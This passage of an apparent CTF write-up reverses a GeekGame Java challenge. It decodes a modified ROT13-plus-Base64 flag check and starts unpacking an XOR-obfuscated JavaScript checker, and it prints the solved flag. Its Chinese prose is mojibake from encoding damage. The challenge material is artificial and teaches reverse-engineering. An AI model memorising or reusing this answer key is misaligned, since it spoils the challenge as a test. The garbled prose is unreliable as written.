    <span class="token class-name">GeekGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setSize</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BoxLayout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> label <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>button2<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span>label<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>button2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Invocable</span> engineByName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÃ†\u0094\u0099\u008e\u009dÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÃ’Â´Ãˆ\u008c\u0087\u008e\u009dÂ¬\u0080\u008b\u008aÂ®\u009bÃˆÃƒÃˆ\u0082\u008e\u009fÃˆÃƒÃˆÃˆÃƒÃˆ\u009c\u009f\u0083\u0086\u009bÃˆÃƒÃˆ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÃˆÃƒÃˆÂ¬\u0080\u009d\u009d\u008a\u008c\u009bÃˆÃƒÃˆÂ¸\u009d\u0080\u0081\u0088ÃˆÃƒÃˆ\u0085Ã‚ÃˆÂ²Ã”\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡Â¥Â¼ Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃœÂ²Â²Ã‡Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÂ°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡ÃŸÃ†\u0092Ã†Ã†Ã’Ã’ÃÂ¥Â¼ Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â´ÃŸÃƒÃÃšÃƒÃÃ™ÃƒÃÃ˜ÃƒÃœÃŸÃƒÃÃŸÃšÃƒÃÃ™ÃƒÃœÃÃƒÃÃ™ÃƒÃ™Ã˜ÃƒÃœÃƒÃœÃœÃƒÃšÃƒÃ™ÃŸÃƒÃ›ÃƒÃÃŸÃ™ÃƒÃ™ÃƒÃ›ÃÃƒÃŸÃƒÃÃƒÃ™Ã˜ÃƒÃœÃƒÃÃ™ÃƒÃ›ÃƒÃ™ÃƒÃœÃœÃƒÃÃœÃÂ²Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ„ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0092Ã†Ã†ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃšÂ²Ã•Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã™Â²Ã†\u0092"</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÃ†\u0094\u0099\u008e\u009dÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÃ’Â´Ãˆ\u008c\u0087\u008e\u009dÂ¬\u0080\u008b\u008aÂ®\u009bÃˆÃƒÃˆ\u0082\u008e\u009fÃˆÃƒÃˆÃˆÃƒÃˆ\u009c\u009f\u0083\u0086\u009bÃˆÃƒÃˆ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÃˆÃƒÃˆÂ¬\u0080\u009d\u009d\u008a\u008c\u009bÃˆÃƒÃˆÂ¸\u009d\u0080\u0081\u0088ÃˆÃƒÃˆ\u0085Ã‚ÃˆÂ²Ã”\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡Â¥Â¼ Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃœÂ²Â²Ã‡Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÂ°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡ÃŸÃ†\u0092Ã†Ã†Ã’Ã’ÃÂ¥Â¼ Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â´ÃŸÃƒÃÃšÃƒÃÃ™ÃƒÃÃ˜ÃƒÃœÃŸÃƒÃÃŸÃšÃƒÃÃ™ÃƒÃœÃÃƒÃÃ™ÃƒÃ™Ã˜ÃƒÃœÃƒÃœÃœÃƒÃšÃƒÃ™ÃŸÃƒÃ›ÃƒÃÃŸÃ™ÃƒÃ™ÃƒÃ›ÃÃƒÃŸÃƒÃÃƒÃ™Ã˜ÃƒÃœÃƒÃÃ™ÃƒÃ›ÃƒÃ™ÃƒÃœÃœÃƒÃÃœÃÂ²Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ„ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0092Ã†Ã†ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃšÂ²Ã•Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã™Â²Ã†\u0092"</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">239</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            engineByName<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringWriter</span> stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>stringWriter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>invocable <span class="token operator">=</span> engineByName<span class="token punctuation">;</span>
        <span class="token function">addWindowListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WindowAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// from class: GeekGame.1</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">windowClosing</span><span class="token punctuation">(</span><span class="token class-name">WindowEvent</span> windowEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">actionPerformed</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> actionEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>actionEvent<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">rot13</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Correct"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>invocable<span class="token punctuation">.</span><span class="token function">invokeFunction</span><span class="token punctuation">(</span>actionEvent<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>button2 <span class="token operator">?</span> <span class="token string">"checkflag2"</span> <span class="token operator">:</span> <span class="token string">"checkflag3"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringWriter</span> stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>stringWriter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">rot13</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">char</span> charAt <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'a'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'m'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'n'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'N'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'5'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'0'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'4'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>charAt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> strArr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">GeekGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œçš„ rot13 çœ‹ä¸Šå»æ˜¯é­”æ”¹äº†çš„ï¼ˆï¼Ÿ<em>éš¾é“æ˜¯ CyberChef é‡åˆ°å¸¦æ•°å­—çš„ ROT13 å¤„ç†é”…äº†ï¼Ÿ</em></p>
<p>flag1 å°±ç›´æ¥æŒ‰ç…§é­”æ”¹åçš„ rot13 æ¢å¤ä¸€ä¸‹ï¼Œç„¶å base64 decode å°±è¡Œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">rot13</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&gt;=</span> <span class="token string">'a'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'m'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'A'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'M'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'n'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'N'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'5'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">&gt;=</span> <span class="token string">'0'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'4'</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span>
        r <span class="token operator">+=</span> x
    <span class="token keyword">return</span> r

flag1 <span class="token operator">=</span> rot13<span class="token punctuation">(</span><span class="token string">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span><span class="token punctuation">)</span>
<span class="token comment"># ZmxhZ3tzMW1wMWUtanZhdl9yZXZ9</span>
flag1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>
<span class="token comment"># flag{s1mp1e-jvav_rev}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h4><p>è¿™ä¸ªéƒ¨åˆ†æ‰§è¡Œäº†ä¸ª JavaScript ä»£ç ï¼Œnashorn æ˜¯ä¸ª js æ‰§è¡Œå¼•æ“</p>
<p>é¦–å…ˆæŠŠè¿™éƒ¨åˆ†å¼‚æˆ–ä¸€ä¸‹æ‹¿åˆ° js ä»£ç ï¼Œå‘ç°æ˜¯æ··æ·†åçš„</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080..."</span>
<span class="token comment"># len(s)</span>
<span class="token comment"># 444</span>

r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">239</span><span class="token punctuation">)</span>
    <span class="token comment"># print(x)</span>
    r <span class="token operator">+=</span> x
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
